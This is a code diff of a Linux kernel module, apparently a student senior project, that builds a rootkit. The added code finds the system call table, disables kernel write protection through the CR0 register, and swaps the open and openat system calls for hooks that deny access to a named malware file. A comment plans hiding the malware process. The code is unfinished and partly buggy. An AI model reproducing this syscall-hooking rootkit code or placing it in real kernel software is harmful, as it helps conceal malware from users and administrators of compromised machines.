@@ -3,34 +3,62 @@
 #include <linux/kernel.h>
 #include <linux/kallsyms.h>
 #include <linux/types.h>
+#include <linux/syscalls.h>
+#include <linux/unistd.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Noop Noop");
 MODULE_DESCRIPTION("Senior Project");
 MODULE_VERSION("0.1");
 
-static void mod_writeonly_mem(uint64_t * addr, uint64_t mem)
+uint64_t * syscall_table;
+char * malware_name;
+
+// previously saved function pointers
+asmlinkage long (*original_sys_openat)(int dfd, const char __user *filename, int flags, umode_t mode);
+asmlinkage long (*original_sys_open)(const char __user *filename, int flags, umode_t mode);
+
+
+asmlinkage long mal_sys_openat(int dfd, const char __user *filename, int flags, umode_t mode)
+{
+		return original_sys_openat(dfd, filename, flags, mode);
+}
+
+asmlinkage long mal_sys_open(const char __user *filename, int flags, umode_t mode)
+{
+		if (!strcmp(filename, malware_name)) {
+				return EACCES;
+		}
+
+		return original_sys_open(filename, flags, mode);
+}
+
+
+static void patch_syscall(uint64_t index, uint64_t function_ptr)
 {
 		write_cr0(read_cr0() & ~0x10000);
-		addr[0] = mem;
+		syscall_table[index] = function_ptr;
 		write_cr0(read_cr0() | 0x10000);
 }
 
 static int __init rootkit_init(void)
 {
-		// Declare variables here (ISOC99)
-		uint64_t syscall_table_addr;
-
 		// Here, install initialization procedures
 		printk(KERN_INFO "Initializing...\n");
 
+		malware_name = MALWARE_NAME;
+
 		// TODO: hook syscall table, reset some function pointers
-		syscall_table_addr = kallsyms_lookup_name("sys_call_table");
-		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", syscall_table_addr);
+		syscall_table = (uint64_t *)kallsyms_lookup_name("sys_call_table");
+		printk(KERN_INFO "SYSCALL TABLE @ %llx\n", syscall_table);
+
+		original_sys_open = (long (*)(const char *, int, umode_t))syscall_table[__NR_open];
+		original_sys_openat = (long (*)(int, const char *, int, umode_t))syscall_table[__NR_openat];
 
 		// in order to write to syscall table, must fix cr0 to allow write
 		// access first!
-		// mod_writeonly_mem(syscall_table_addr, 0x1234);
+		patch_syscall(__NR_open, (uint64_t)mal_sys_open);
+		patch_syscall(__NR_openat, (uint64_t)mal_sys_openat);
 
 		// TODO: find malware process and remove from process list
 		return 0;
